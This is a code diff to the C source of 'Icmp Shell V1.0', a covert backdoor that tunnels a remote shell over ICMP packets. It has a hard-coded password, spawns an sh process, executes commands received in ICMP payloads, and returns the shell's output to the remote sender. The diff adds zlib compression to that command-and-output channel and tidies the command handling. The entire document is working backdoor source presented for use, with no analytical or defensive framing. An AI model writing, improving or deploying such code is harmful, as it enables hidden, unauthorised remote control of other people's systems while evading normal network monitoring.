@@ -64,7 +64,7 @@ char *g_Cmd = NULL; //要执行的命令
 char *g_Request = NULL;//请求的数据吧
 char *g_password = "sincoder"; //通信的密码
 int  g_child_pid = 0;// pid of sh
-char *g_hello_msg = "\x2BIcmp Shell V1.0 \n\
+char *g_hello_msg = "Icmp Shell V1.0 \n\
 By: sincoder \n\
 command:\n\
 \trestartshell\n";
@@ -224,10 +224,26 @@ void  icmpshell_sendrequest(uint32 ip)
 {
     int len = 0;
     char buff[513];
-    buff[0] = TYPE_REQUEST;
+    char compress_buff[1024];
+    uLongf compress_len = sizeof(compress_buff) -1;
+    compress_buff[0] = TYPE_REQUEST;
     pthread_mutex_lock(&g_output_mutex);
-    len = buffer_read(&g_output_buffer, &buff[1], 512);
-    icmp_sendrequest(g_icmp_sock, ip, &buff[0], len + 1);
+    len = buffer_read(&g_output_buffer, &buff[0], 512);
+    if(len)
+    {
+        if (Z_OK == compress(&compress_buff[1], &compress_len, buff, len))
+        {
+            icmp_sendrequest(g_icmp_sock, ip, &compress_buff[0], compress_len + 1);
+        }
+        else
+        {
+            printf("compress failed !!\n");
+        }
+    }
+    else
+    {
+        icmp_sendrequest(g_icmp_sock, ip, &compress_buff[0], 1);
+    }
     pthread_mutex_unlock(&g_output_mutex);
 }
 
@@ -354,18 +370,19 @@ int icmpshell_process_command(char *cmd)
         }
         ++ch;
     }
-    //if(len < 1) // empty command 
+    cmd[len] = 0;
+    //if(len < 1) // empty command
     //    return 1;
-    dbg_msg("%s: cmd: %s ",__func__,cmd);
+    dbg_msg("%s: cmd: %s ", __func__, cmd);
     if (0 == strncasecmp(cmd, "restartshell", len))
     {
-        dbg_msg("%s : try kill shell ! \n",__func__);
+        dbg_msg("%s : try kill shell ! \n", __func__);
         // restart me
         if (-1 == kill(g_child_pid, 9))
         {
             // failed kill
             char *err_msg = "\nfailed to kill shell \n";
-            icmp_append_send_buffer(err_msg,strlen(err_msg));
+            icmp_append_send_buffer(err_msg, strlen(err_msg));
         }
     }
     else if (-1 == write(write_pipe[1], cmd, len ))
@@ -421,17 +438,32 @@ void *Icmp_RecvThread(void *lparam)
                                 char request_buff[sizeof(struct packet_header) + sizeof(g_output_buffer)];
                                 char *data = (char *)(phdr + 1);
 
-                                dbg_msg("%s: msg type reply !! \n", __func__);
-                                dbg_msg("%s : recv %d bytes : %s \n", __func__, nbytes, data);
-                                if (nbytes >= 0)
+                                //dbg_msg("%s: msg type reply !! \n", __func__);
+                                //dbg_msg("%s : recv %d bytes : %s \n", __func__, nbytes, data);
+                                if (nbytes > 0)
                                 {
-                                    data[nbytes] = '\0';
-                                    if (icmpshell_process_command(data))
+                                    // uncompress buff
+                                    char  uncompress_buff[1024];
+                                    uLongf uncompree_buff_len = sizeof(uncompress_buff);
+                                    if (Z_OK == uncompress(uncompress_buff, &uncompree_buff_len, data, nbytes))
                                     {
-                                        //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的
-                                        MySleep(SLEEP_TIME);
-                                        icmpshell_sendrequest(ip->saddr);
+                                        uncompress_buff[uncompree_buff_len] = 0;
+                                        if (icmpshell_process_command(&uncompress_buff[0]))
+                                        {
+                                            //我们也要马上 发回一个 request 来看看 有木有数据了 此时要延时的
+                                            MySleep(SLEEP_TIME);
+                                            icmpshell_sendrequest(ip->saddr);
+                                        }
                                     }
+                                    else
+                                    {
+                                        dbg_msg("%s: uncompress failed !! \n", __func__);
+                                    }
+                                }
+                                else // no data
+                                {
+                                    MySleep(SLEEP_TIME);
+                                    icmpshell_sendrequest(ip->saddr);
                                 }
                             }
                             break;
@@ -454,9 +486,15 @@ void *Icmp_RecvThread(void *lparam)
                             char *data = (char *)(icmp + 1);
                             if (TYPE_REQUEST == data[0])
                             {
+                                char compress_buff[1024];
+                                uLongf buff_len = sizeof(compress_buff)-1;
+                                compress_buff[0] = TYPE_REQUEST;
                                 dbg_msg("%s: recv a icmp request from %s \n", __func__, iptos(ip->saddr));
-
-                                icmp_sendrequest(g_icmp_sock, ip->saddr, (uint8 *)g_hello_msg, strlen(g_hello_msg)); //
+                                if(Z_OK == compress(&compress_buff[1],&buff_len,g_hello_msg,strlen(g_hello_msg)))
+                                {
+                                    icmp_sendrequest(g_icmp_sock, ip->saddr, (uint8 *)compress_buff, buff_len + 1); //
+                                }
+                                
                             }
                         }
                     }
